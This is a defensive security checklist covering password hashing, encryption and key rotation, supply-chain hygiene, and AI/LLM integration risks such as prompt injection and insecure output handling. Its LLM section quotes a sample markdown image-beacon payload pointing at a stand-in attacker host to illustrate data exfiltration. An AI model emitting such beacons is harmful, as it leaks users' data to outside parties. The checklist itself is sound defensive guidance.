# Cryptography, Supply Chain & AI/LLM Security Checklist (`references/crypto-supply-chain-and-ai-security.md`)

> **Baseline Standards**: OWASP Top 10:2021 (`A02`, `A06`, `A08`, `A09`), OWASP ASVS v4.0.3 / v5.0 (`V6 Cryptography`), OWASP Top 10 for LLM Applications `2025`, RFC `9106` (Argon2id), NIST SP `800-57` (Key Management), RFC `9116` (`security.txt`).
> **Mandate**: Load and enforce this checklist when auditing or implementing encryption, password hashing, JWT signing, key management/rotation, CI/CD supply-chain security, secret redaction, or AI/LLM integrations.

> [!IMPORTANT]
> **Continuous Evolution Mandate**: This checklist is a mandatory baseline floor. Security engineers must continuously evaluate emerging cryptographic weaknesses, dependency compromises, and adversarial LLM prompt/tool abuse vectors.

---

## 1. Cryptographic Standards & Key Management (OWASP A02:2021 / NIST SP 800-57)

- [ ] **1.1 Password Hashing (Argon2id — RFC 9106)**: Hash all user passwords using **Argon2id** with OWASP-recommended parameters (`memoryCost >= 19456` KiB, `timeCost >= 2`, `parallelism = 1`). Never use MD5, SHA-1, plain SHA-256, or unconfigured low-cost bcrypt.
- [ ] **1.2 Authenticated Symmetric Encryption (AEAD)**: Encrypt sensitive secrets at rest (OAuth refresh tokens, TOTP seeds, API keys, PII/PHI fields) using **AES-256-GCM** or **ChaCha20-Poly1305** with a unique random 96-bit (12-byte) IV/nonce per encryption operation, storing `version:iv:authTag:ciphertext`. Never reuse an IV with the same key or use unauthenticated `AES-CBC` / `AES-ECB`.
- [ ] **1.3 Cryptographically Secure Randomness (CSPRNG)**: Generate all session IDs, CSRF tokens, password reset codes, OTPs, and API keys using a CSPRNG (`crypto.randomBytes(32)`, `crypto.randomUUID()`, `crypto.getRandomValues()`). **Never use `Math.random()`** for any security-relevant value.
- [ ] **1.4 Constant-Time Secret Comparison**: Compare HMAC signatures, API keys, CSRF tokens, and OTP codes using `crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b))` (after verifying equal byte length) to eliminate timing side-channel attacks.
- [ ] **1.5 TLS 1.3 & Transit Security**: Enforce HTTPS everywhere with **TLS 1.3** (and TLS 1.2 with strong AEAD cipher suites only), disabling SSLv3, TLS 1.0, and TLS 1.1.
- [ ] **1.6 JWT Cryptographic Hygiene**:
  - Explicitly specify the allowed `algorithms` array during verification (e.g., `algorithms: ['EdDSA']` or `['ES256']`).
  - Reject `alg: "none"` and prevent asymmetric-to-symmetric key confusion (`RS256` $\rightarrow$ `HS256` signed with public key).
  - Validate `iss` (issuer), `aud` (audience), `exp` (expiration), and `nbf` (not before) claims on every token.
- [ ] **1.7 Envelope Encryption (KEK / DEK Hierarchy)**:
  - For high-assurance secrets or bulk PII/PHI/financial vaults, never encrypt all database rows directly with a single static environment variable key.
  - Generate a unique random **Data Encryption Key (DEK)** per tenant or per record to encrypt the payload (`AES-256-GCM`), and encrypt ("wrap") the DEK using a **Key Encryption Key (KEK)** stored in a dedicated KMS / HSM / HashiCorp Vault (`encrypted_dek` stored alongside the record).
- [ ] **1.8 Zero-Downtime Key Rotation (`keyVersion` Prefixing)**:
  - Prefix every serialized ciphertext and HMAC with a key version identifier (e.g., `v2:base64(iv):base64(authTag):base64(ciphertext)`).
  - Configure the application keyring with an `activeKeyVersion` (`v2`) for all new writes and a map of historical keys (`v1`, `v2`) for reads, enabling seamless background re-encryption and emergency key rotation without downtime.

---

## 2. Supply Chain, Secrets & Operational Hygiene (OWASP A06, A08, A09:2021)

- [ ] **2.1 Lockfile Integrity & Lifecycle Scripts**: Commit lockfiles (`pnpm-lock.yaml`, `package-lock.json`), enforce `--frozen-lockfile` in CI, and disable arbitrary `postinstall` script execution (`ignore-scripts=true` with explicit `onlyBuiltDependencies` allowlist) to mitigate malicious npm package compromises.
- [ ] **2.2 Automated Vulnerability & Secret Scanning**: Run `gitleaks` (secrets), `pnpm audit` / OSV-Scanner / Trivy (dependencies & containers), and SAST checks on every PR.
- [ ] **2.3 Software Bill of Materials (SBOM)**: Generate a CycloneDX or SPDX SBOM artifact during production release builds.
- [ ] **2.4 PII & Secret Redaction in Logs (A09:2021)**: Configure structured loggers to automatically redact `Authorization`, `Cookie`, `Set-Cookie`, `password`, `token`, `apiKey`, `ssn`, `creditCard`, and full payment/health payloads before writing to stdout or telemetry sinks.
- [ ] **2.5 Vulnerability Disclosure Policy (`security.txt`)**: Publish a valid RFC 9116 `/.well-known/security.txt` file containing `Contact`, `Expires`, and `Preferred-Languages`.

---

## 3. AI & LLM Integration Security (OWASP Top 10 for LLM 2025)

When an application integrates Large Language Models, RAG pipelines, or AI agents:

- [ ] **3.1 Direct & Indirect Prompt Injection Defense (LLM01)**:
  - Never treat LLM outputs as trusted instructions for privileged tool execution.
  - Clearly delimit untrusted user input or retrieved RAG documents (e.g., XML tags with strict system instructions) and enforce deterministic policy gates outside the LLM before invoking any state-mutating tool/function call.
- [ ] **3.2 Insecure Output Handling (LLM05)**:
  - Treat all LLM-generated text/markdown/code as **untrusted user input**: sanitize HTML with DOMPurify before rendering (preventing Markdown/HTML XSS and image-beacon data exfiltration `![leak](https://attacker.com/?q=...)`) and never pass LLM-generated SQL/shell strings directly to execution engines without parameterized sandboxing.
- [ ] **3.3 Sensitive Information Disclosure in RAG (LLM02)**:
  - Enforce tenant and user-level access control filters **at the vector database retrieval query layer** (`WHERE tenant_id = $1 AND allowed_roles && $2`) before passing context chunks into the LLM prompt.
- [ ] **3.4 Unbounded Consumption / Denial of Wallet (LLM10)**:
  - Enforce strict per-user/per-tenant token budgets, maximum input token lengths (`max_tokens`), request rate limits, and hard daily spend circuit breakers on all AI endpoints.
